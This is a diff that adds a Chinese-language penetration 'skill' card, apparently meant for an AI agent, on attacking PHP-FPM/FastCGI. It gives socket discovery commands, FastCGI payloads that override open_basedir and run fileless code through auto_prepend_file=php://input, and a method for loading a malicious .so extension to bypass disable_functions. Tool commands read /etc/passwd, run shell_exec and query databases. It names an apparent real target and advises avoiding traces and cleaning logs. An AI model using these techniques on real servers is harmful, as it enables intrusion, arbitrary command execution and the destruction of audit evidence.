@@ -1,0 +1,124 @@
+---
+name: php-fpm-fastcgi-rce
+description: "打 PHP-FPM/FastCGI: open_basedir 绕过+disable_functions RCE。"
+version: 1.0.0
+license: MIT
+metadata:
+  hermes:
+    tags: [pentest, php, fpm, fastcgi, open_basedir, disable_functions, rce, unix-socket]
+    related_skills: [cms-updater-zip-extract-rce, admin-backdoor-persistence, file-upload-webshell, rce-encyclopedia]
+---
+
+# PHP-FPM / FastCGI 面：open_basedir 绕过 + disable_functions 下的 RCE
+
+> 实战来源: phpv4.88demo.cn (2026-09-22 Active eCommerce 链) —— 拿到任意文件写却只做到「任意文件读」，
+> 原报告结论是「disable_functions 绕过路径已穷尽 → 无法 OS 命令 → 无法提权」。
+> **本卡把那条死路拆成可继续推的三级阶梯**（含原报告漏掉的 extension 加载路线）。
+> 协议细节已核 php-src `main/fastcgi.c` + nginx `ngx_http_fastcgi_module.c`，并用本地 mock FPM 端到端自测通过。
+
+## 何时用
+
+- 已拿到任意文件写/读（webshell、后台「解压到项目根」、模板写、日志投毒），但 `open_basedir=/site/:/tmp/` 锁死视野
+- `disable_functions` 封了 `shell_exec/exec/system/popen/proc_open/passthru/pcntl_exec`，但 `file_get_contents/file_put_contents/curl_exec/fsockopen/stream_socket_client` 还在
+- 想**不落盘**跑任意 PHP（比丢 webshell 隐蔽）
+- 目标暴露 FPM socket 或 `:9000`（TCP 暴露 = 无前置条件直接打）
+
+## §1 找面（socket / TCP）
+
+```bash
+ss -xlp | grep -iE 'php|fpm'                                 # 有 ss 时
+cat /proc/net/unix | grep -iE 'php|fpm'                      # 无 ss 时
+ls -l /tmp/php-cgi-*.sock /dev/shm/php-cgi-*.sock /run/php/*.sock /var/run/php-fpm/*.sock
+grep -rn '^listen' /www/server/php/*/etc/php-fpm.d/*.conf 2>/dev/null   # 宝塔
+grep -rn '^listen' /etc/php/*/fpm/pool.d/*.conf 2>/dev/null             # Debian/Ubuntu
+```
+
+常见: 宝塔 `/tmp/php-cgi-74.sock` 或 `/dev/shm/php-cgi-74.sock`；Debian `/run/php/php7.4-fpm.sock`；
+通用 `/var/run/php-fpm/www.sock`；Docker `/run/php-fpm.sock`；TCP 版 `127.0.0.1:9000`。
+
+**权限判定（决定能不能连）**: unix socket 是文件权限 —— 当前 PHP 进程 `posix_getuid()` 必须等于 socket 属主/属组且对应权限位可写。
+宝塔站点常态 `srw-rw-rw- www www` → 站内 webshell（同 uid）可连。连不上时**别 chmod（留痕）**，改去找同服其他项目里同 uid 的落点。
+
+## §2 协议硬事实（已核源码，别重踩坑）
+
+- header 固定 8 字节: `version(1) type(1) reqId(2) contentLen(2) paddingLen(1) reserved(1)`
+- **`FCGI_BEGIN_REQUEST` 的 body 必须 8 字节** = `roleB1 roleB0 flags reserved[5]`
+  - php-src `main/fastcgi.c` 判定 `type==FCGI_BEGIN_REQUEST && len==sizeof(fcgi_begin_request)`：**7 字节直接不匹配**（进不了分支，后续记录被当垃圾 → 表现为 `rawlen=0`）
+  - nginx `ngx_http_fastcgi_begin_request_t` = `role_hi/role_lo/flags/reserved[5]`（role=1=FCGI_RESPONDER）
+  - PHP 正确写法 `pack('nCx5', 1, 0)` = `00 01 00 00 00 00 00 00`；**错的** `pack('nC5',1,0,0,0,0,0,0)` 只出 7 字节（多出的参数被忽略）
+- `FCGI_PARAMS`：名字/值长度编码 1 字节，≥0x80 时用 4 字节（高位置 1）大端；参数流以**空 PARAMS 记录**结束
+- `FCGI_STDIN` 以**空 STDIN 记录**结束；响应读 STDOUT/STDERR 直到 `FCGI_END_REQUEST`
+- **必需参数**: `SCRIPT_FILENAME`（**磁盘上真实存在**且以 `.php` 结尾 —— `security.limit_extensions` 默认只放 `.php`，否则 `Access to the script ... has been denied` / `Primary script unknown`）、
+  `REQUEST_METHOD`、`CONTENT_LENGTH`（有 body 时）、`QUERY_STRING`、`DOCUMENT_ROOT`、`SERVER_PROTOCOL`
+
+## §3 三级阶梯（按收益递进，别停在 L1）
+
+**L1 — `open_basedir=/` 任意文件读写（原报告走的路）**
+```
+PHP_ADMIN_VALUE: open_basedir=/\n
+```
+原理：`open_basedir` 是**运行时**检查 → 请求级可覆盖（与 `disable_functions` 相反）。
+
+**L2 — 不落盘 PHP 代码执行（原报告漏掉，比 webshell 隐蔽）**
+```
+PHP_ADMIN_VALUE: open_basedir=/\nallow_url_include=On\nauto_prepend_file=php://input\n
+SCRIPT_FILENAME: <磁盘上真实存在的 .php，如 /var/www/html/index.php>
+CONTENT_LENGTH: len(STDIN)
+STDIN: <?php ...;die();
+```
+`allow_url_include` 是 PHP_INI_SYSTEM → 必须走 `PHP_ADMIN_VALUE`（不是 `PHP_VALUE`）。代码只在内存里，**磁盘零残留**。
+
+**L3 — disable_functions 下要 OS 命令：挂自写 .so（关键升级，本卡核心价值）**
+```
+PHP_ADMIN_VALUE: open_basedir=/\nallow_url_include=On\nauto_prepend_file=php://input\nextension_dir=/tmp\nextension=evil\n
+```
+思路（FuckFastCGI）: 把自编扩展 `.so` 写到可写目录 → 请求级 `extension_dir + extension` 加载 → C 层直接调 `php_exec`/`system` 绕过已被移除的函数表 → 再从 PHP 调自定义函数。
+前置条件（三个缺一不可）: ①能写 `.so`（有任意文件写即可）②架构/`PHP API` 版本/ZTS 匹配（`php -i | grep -E 'API|Thread Safety|Zend Extension Build'`，失败尝试不同 API 号的 release tag）③`extension_dir` 可写且 PHP 能读。
+> 原报告说「disable_functions 绕过已穷尽」是错的：putenv/LD_PRELOAD/FFI/dl 都需重启或受限于函数表，
+> 而 `.so` 加载是在请求初始化阶段完成的，与函数表无关。详见 `references/fuckfastcgi-extension.md`。
+
+**L4 — 信息面（零成本）**: `SCRIPT_NAME=/status`（可加 `QUERY_STRING=full`）读 pool 状态（进程数/排队/慢请求/最近请求 URI），`/ping` 探存活。
+
+## §4 落地工具（本卡自带，已自测）
+
+`scripts/fcgi_client.py`（纯 stdlib，不需目标机装任何东西）:
+```bash
+python3 fcgi_client.py probe  --target unix:///tmp/php-cgi-74.sock            # 找可用的 SCRIPT_FILENAME
+python3 fcgi_client.py ls     --target unix:///tmp/php-cgi-74.sock --script /var/www/html/index.php --path /www
+python3 fcgi_client.py read   --target unix:///tmp/php-cgi-74.sock --script /var/www/html/index.php --path /etc/passwd
+python3 fcgi_client.py write  --target ... --script ... --path /tmp/a.php --data-b64 PD9waHAgZWNobyAxOw==
+python3 fcgi_client.py exec   --target ... --script ... --code 'echo shell_exec("id");'
+python3 fcgi_client.py db     --target ... --script ... --dbn phpv4 --sql-b64 U0VMRUNUIDEqIEZST00gdXNlcnM=
+python3 fcgi_client.py ext    --target ... --script ... --so-dir /tmp --so-name evil --code 'evil_cmd("id");'
+python3 fcgi_client.py status  --target ... --script ...
+```
+自测（不接触真实目标，验证包合法性与协议行为）: `python3 scripts/test_fcgi.py` → 依次跑 probe/read/exec/ext/status + `limit_extensions` 拒绝路径 + **7/8 字节 BEGIN body 反例**，应全绿。
+
+回归用 FPM 模拟器: `scripts/mock_fpm.py`（复刻 php-src 对 `BEGIN_REQUEST.contentLength != 8` 的拒绝行为，`test_fcgi.py` 会拉起它）——**无需目标机、无需真 PHP** 就能验证客户端合规。
+
+> 注意: `unix://` 需要运行 Python 支持 `AF_UNIX`（Windows 自带 Python 常不支持）→ 在跳板机/目标机 Linux 上跑，或改 `host:port`。
+
+## §5 Pitfalls（每条都踩过或核过源码）
+
+- **`disable_functions` 清 ini 无效**: worker 启动时就已从函数表移除，`PHP_ADMIN_VALUE: disable_functions=`（置空）不会把函数变回来。只有改主 `php.ini` + 重启 FPM 才行（别重启，会断站）。要命令执行只能走 L3 挂 `.so`。
+- **`open_basedir` 相反**: 它是运行时检查 → 请求级 `PHP_ADMIN_VALUE` 有效。这一条决定了「文件能读但命令不能跑」。
+- **`open_basedir=/` 也只是当前 uid 的视野**: 宝塔 `/www/server/panel/data/`（root 0700）依旧读不到；提权仍需 OS 命令 / SUID / sudo 配置。别把「任意文件读」当成「接管服务器」。
+- **pool 里 `php_admin_value[open_basedir]` 显式设过时**，请求级覆盖可能被忽略（视 FPM 版本）→ 双写 `PHP_VALUE` + `PHP_ADMIN_VALUE`，仍不行则退 L2/L3（`extension` 走的不是同一套校验）。宝塔场景实战可覆盖。
+- **`SCRIPT_FILENAME` 猜不中** → 优先用: 报错页泄露的绝对路径、`.env` 的 `APP_URL`/`DOCUMENT_ROOT`、同服其他项目的 `index.php`（存在即可，不需要它有业务意义）、宝塔默认 `/www/server/phpmyadmin/index.php`。
+- **残留物**: 用完删临时 `.php`/`.so`（L2/L3 不落盘，只需清 `.so`）；FPM 也有 `slowlog`/`access.log`，且在 Nginx access log 里会留下一条无 UA 的本地请求 → 清理阶段一并处理。
+- **别 kill/重启 FPM**: 本卡全程只读 + 请求级覆盖，不碰服务。
+
+## §6 交付前验证清单
+
+1. `probe` 至少拿到一个 `OK` 的 SCRIPT_FILENAME（否则后面全白搭）
+2. L1: `read /etc/passwd` 或 `read <站点目录外的文件>` 成功 → open_basedir 已破
+3. L2: `exec 'echo md5("x")'` 能回显 → 代码执行确认（不用 system）
+4. L3: `ext` 后 `id`/`whoami` 回显 → 真正的 OS 命令（这才是原报告缺的那一步）
+5. 所有产物（.so/临时文件）清理干净，站点 200 验证
+
+## §7 关联
+
+- 上游获取入口（怎么先拿到任意文件写/读）: `cms-updater-zip-extract-rce`（含 DocumentRoot 错位、`/update` 解压、同族家族）
+- 落盘后门（框架核心注入 / 触发设计 / 隐蔽性）: `admin-backdoor-persistence`
+- 协议与恶意扩展细节: `references/fcgi-protocol.md`、`references/fuckfastcgi-extension.md`
+
